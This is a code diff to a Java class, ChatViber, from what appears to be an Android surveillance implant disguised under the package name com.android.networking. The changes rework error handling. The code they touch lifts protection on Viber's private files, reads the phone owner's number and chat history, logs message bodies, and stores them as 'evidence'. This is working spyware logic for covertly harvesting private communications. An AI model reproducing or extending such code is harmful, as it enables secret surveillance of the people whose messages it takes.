@@ -22,6 +22,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.db.GenericSqliteHelper;
 import com.android.networking.db.RecordVisitor;
 import com.android.networking.file.Path;
+import com.android.networking.manager.ManagerModule;
 import com.android.networking.module.ModuleAddressBook;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
@@ -55,27 +56,19 @@ public class ChatViber extends SubModuleChat {
 
 	@Override
 	void notifyStopProgram() {
-		try {
-			readViberMessageHistory();
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notifyStopProgram) Error: " + e);
-			}
-		}
+		readViberMessageHistory();
 	}
 
 	@Override
 	protected void start() {
 		lastViber = markup.unserialize(new Hashtable<String, Long>());
-		try {
-			account = readMyPhoneNumber();
+
+		account = readMyPhoneNumber();
+		if (account != null) {
+
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.VIBER, account);
 
 			readViberMessageHistory();
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notifyStopProgram) Error: " + e);
-			}
 		}
 
 		if (Cfg.DEBUG) {
@@ -84,20 +77,21 @@ public class ChatViber extends SubModuleChat {
 	}
 
 	private String readMyPhoneNumber() {
-		String number = "";
+		String number = null;
 		String file = "/data/data/com.viber.voip/files/preferences/reg_viber_phone_num";
 
-		Path.unprotect(file, 4);
-		FileInputStream fileInputStream;
-		try {
-			fileInputStream = new FileInputStream(file);
-			ObjectInputStream oInputStream = new ObjectInputStream(fileInputStream);
-			Object one = oInputStream.readObject();
-			number = (String) one;
-		} catch (Exception e) {
-			if (Cfg.DEBUG) {
-				e.printStackTrace();
-				Check.log(TAG + " (readMyPhoneNumber) Error: " + e);
+		if (Path.unprotect(file, 4)) {
+			FileInputStream fileInputStream;
+			try {
+				fileInputStream = new FileInputStream(file);
+				ObjectInputStream oInputStream = new ObjectInputStream(fileInputStream);
+				Object one = oInputStream.readObject();
+				number = (String) one;
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					e.printStackTrace();
+					Check.log(TAG + " (readMyPhoneNumber) Error: " + e);
+				}
 			}
 		}
 
@@ -111,7 +105,7 @@ public class ChatViber extends SubModuleChat {
 		}
 	}
 
-	private void readViberMessageHistory() throws IOException {
+	private void readViberMessageHistory() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (readViberMessageHistory)");
 		}
@@ -295,7 +289,8 @@ public class ChatViber extends SubModuleChat {
 								body, incoming);
 
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (cursor) message: " + message.from + " " + (message.incoming? "<-": "->") + " " + message.to + " : " + message.body);
+							Check.log(TAG + " (cursor) message: " + message.from + " "
+									+ (message.incoming ? "<-" : "->") + " " + message.to + " : " + message.body);
 						}
 						messages.add(message);
 					}
